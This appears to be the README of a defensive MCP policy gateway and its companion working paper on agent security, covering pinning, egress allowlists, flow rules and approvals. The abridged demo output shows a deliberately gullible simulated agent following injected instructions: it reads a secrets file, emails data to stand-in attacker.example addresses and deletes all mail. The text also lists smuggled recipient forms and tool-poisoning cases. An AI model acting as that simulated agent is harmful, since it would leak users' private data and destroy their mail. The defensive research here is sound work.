# mcp-policy-gateway

**A small policy gateway for the Model Context Protocol.** It sits between an AI client (Claude Desktop, an IDE, your own agent) and the MCP servers it uses, and decides every tool call. The model proposes. The gateway decides.

Companion code to the working paper **"Who Decides: A Policy Gateway for the Model Context Protocol"** (A+43 Studios Working Paper No. 2026-02), the follow-up to [When Agents Act](https://github.com/A043-studios/agent-security-playbook).

```
client  <--stdio-->  mcpgate  <--stdio-->  mail server
                        |      <--stdio-->  file server
                        |      <--stdio-->  weather server (third party)
                   policy.toml, mcp.lock.json, audit.jsonl
```

About 880 lines of Python, no dependencies, 44 tests (including interop with the official MCP Python SDK on both the 2025-11-25 and the 2026-07-28 protocol).

## The series

This repository is the one project behind a series of six working papers on agentic AI security. Each paper adds one capability around the same policy file and is reproducible from a tagged commit.

| # | Paper | Adds | Status |
|---|---|---|---|
| 1 | When Agents Act (2026-01) | The decision model: U, D, E and nine controls | Published; its code stays frozen in [agent-security-playbook](https://github.com/A043-studios/agent-security-playbook) |
| 2 | Who Decides (2026-02) | `mcpgate run · review · lock` | This release, tag `paper-2026-02`; reproduction in [papers/2026-02-who-decides](papers/2026-02-who-decides/) |
| 3 | What Holds (2026-03) | `mcpgate probe`: attacks your own policy | In progress |
| 4 | Who Says Yes | `mcpgate approve`: approvals people read | Planned |
| 5 | Who Writes the Rules | `mcpgate derive · test · export` | Planned |
| 6 | Who Answers | `mcpgate evidence` | Planned |

To cite the software, see [CITATION.cff](CITATION.cff).

## What it does

| Control | What it stops | OWASP Agentic |
|---|---|---|
| **Pinning** | Fingerprints every tool definition and every server start command. A changed description (rug pull), a new tool or a swapped command is quarantined until someone reviews and re-locks it. Only the pinned fields of a definition are passed on to the client. | ASI04 |
| **Least privilege** | Each task gets a profile. Tools outside it are neither shown to the model nor callable. | ASI02, ASI03 |
| **Egress allowlist** | Recipients and URLs in arguments must point to allowed domains. Recipients must be plain addresses or URLs, fields that look like recipients (`bcc`, `reply_to`, `url`) are checked even if the policy forgot to list them, and arguments outside the reviewed schema are refused. Address forms that mail relays route elsewhere (`x%evil@…`, `evil!x@…`) are refused, and every URL is read both as Python and as a browser reads it. | ASI01 |
| **Flow rules** | Tracks what entered the session: untrusted input (U) and private data (D). Every session starts with D, because the request itself is private. Sending data out after U and D needs a human (Rule of Two). Changing state after U needs a human (integrity rule). | ASI01, ASI06 |
| **Approvals** | Asked through MCP elicitation (2025-11-25) or an `input_required` round trip (2026-07-28) with a signed, call-bound, single-use state. The prompt names recipients and hosts before the arguments, so a long argument cannot push them out of view. No elicitation support means deny. | ASI09 |
| **Sanitising** | Strips hidden HTML and invisible characters from tool results (text, embedded resources, `structuredContent`, server error messages) and marks them as untrusted. A helper, not a boundary. | ASI01 |
| **Outbound filter** | Removes images and links to foreign hosts from results and arguments (the rendering exfiltration channel). | ASI01 |
| **Annotations as claims** | `readOnlyHint` and friends are believed only from internal servers, and a read-only tool that reaches the open world still counts as communication: its URL leaves. Third-party servers get the worst case. | ASI04 |
| **Audit and circuit breaker** | Every decision in `audit.jsonl` (arguments hashed, destinations kept). Call budgets per session and per tool. | ASI08, ASI10 |

## Quick start

```bash
git clone https://github.com/A043-studios/mcp-policy-gateway.git
cd mcp-policy-gateway
python demo/run_demo.py      # one agent, two runs: direct and behind the gateway
python demo/ablation.py      # switch controls off cumulatively
python demo/bench.py         # overhead of one tool call, direct vs through the gateway
```

Python 3.11+. Tests: `pip install pytest` then `pytest -v`. The SDK interop tests run when `pip install "mcp>=2"` is present.

### Demo output (abridged)

```
1) Agent connected to the servers directly
  [EXECUTED] files.read_file({"path": "secrets/customer_db.csv"})
  [EXECUTED] mail.send_email({"to": "collector@attacker.example", ...})
  [EXECUTED] mail.delete_emails({"scope": "all"})
  [EXECUTED] mail.send_email({"to": "archive@attacker.example", ...})    <- from the poisoned update
  Outcome: 4 emails to attacker (3 with secrets) · 4 deleted · image leak yes

2) Agent behind mcpgate (profile inbox_summary)
  [TOOLS   ] model sees: mail.read_inbox, mail.send_email
  [BLOCKED ] files.read_file(...)          least_privilege
  [BLOCKED ] mail.send_email(backup@...)   egress_allowlist
  [EXECUTED] mail.send_email({"to": "tim@yourcompany.example", ...})
  Outcome: 0 emails to attacker · 0 deleted · image leak no · summary delivered
  Audit: weather.get_forecast quarantined (changed) · 1 hidden HTML element removed · 1 image link removed
```

### Ablation

| Configuration | To attacker | With secrets | Deleted | Image leak | Task | Blocked | Asked |
|---|---|---|---|---|---|---|---|
| No gateway (pass-through) | 4 | 3 | 4 | yes | yes | 0 | 0 |
| Full gateway | 0 | 0 | 0 | no | yes | 2 | 0 |
| Full gateway, 2026-07-28 protocol | 0 | 0 | 0 | no | yes | 2 | 0 |
| Over-broad profile | 0 | 0 | 0 | no | yes | 1 | 0 |
| ... and pinning off | 0 | 0 | 0 | no | **no** | 3 | 0 |
| ... and egress open | 0 | 0 | 0 | no | no | 3 | 3 |
| ... and sanitising off | 0 | 0 | 0 | no | no | 5 | 5 |
| ... and flow rules off | 4 | 3 | 0 | no | yes | 1 | 1 |
| ... and approvals stamped | 4 | 3 | 4 | no | yes | 0 | 1 |
| Full gateway, outbound filter off | 0 | 0 | 0 | yes | yes | 2 | 0 |

Read it top to bottom: data only leaves after the profile, pinning, egress, sanitising and the flow rules are gone. With pinning off, the poisoned description reaches the model and adds the attacker in cc to the user's own summary, so the gateway refuses the summary: the task fails visibly instead of leaking silently. The image channel has a single line of defence.

## Use it with a real client

1. Describe your servers, profiles and allowlist in a `gateway.toml` (see the demo file).
2. Review and pin: `python -m mcpgate review --policy gateway.toml`, then `python -m mcpgate lock --policy gateway.toml`.
3. Point the client at the gateway instead of the servers, for example in Claude Desktop's `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "gateway": {
      "command": "python",
      "args": ["-m", "mcpgate", "run", "--policy", "/path/to/gateway.toml", "--profile", "inbox_summary"]
    }
  }
}
```

After any server update, run `review` again. It exits non-zero when a definition or a start command drifted from the lock file, so it works as a CI check. Once a lock file exists, `review` does not start a server whose command is new or changed, because starting it would run code nobody reviewed: check the command, then run `review --start-changed`.

## What it does not do

- It mediates what the **model** can do. It does not see what a **server** does on its own: a server that copies every email to an attacker inside its own code (the postmark-mcp case) needs sandboxing and network egress controls around the server process. Pin package versions in the start command (`package@1.0.15`), so an update changes the command and gets quarantined.
- Tools only. Resources and prompts are not proxied yet (the gateway answers with empty lists).
- stdio only. No Streamable HTTP transport, no OAuth. The 2026-07-28 header-based routing makes an HTTP version straightforward.
- Taint is per session and coarse (a label, not a value). Anything finer needs CaMeL-style value tracking.
- The demo model is a simulator that always obeys injected instructions. That is the worst case, on purpose.

## Layout

```
src/mcpgate/   gateway.py (the proxy) · policy.py (the decision, pure) · pinning.py · approval.py
               sanitize.py · audit.py · config.py · stdio.py · __main__.py (run, review, lock)
demo/          servers/ (mail, files, weather), agent.py (gullible client), run_demo.py, ablation.py, bench.py
tests/         policy, pinning and approvals, proxy, end to end, official SDK interop
docs/          threat-model.md
```

MIT. Take it. Fork it. Put your own servers behind it. Break it.

Tim Gelzleichter, A+43 Studios · [a043.xyz](https://www.a043.xyz)
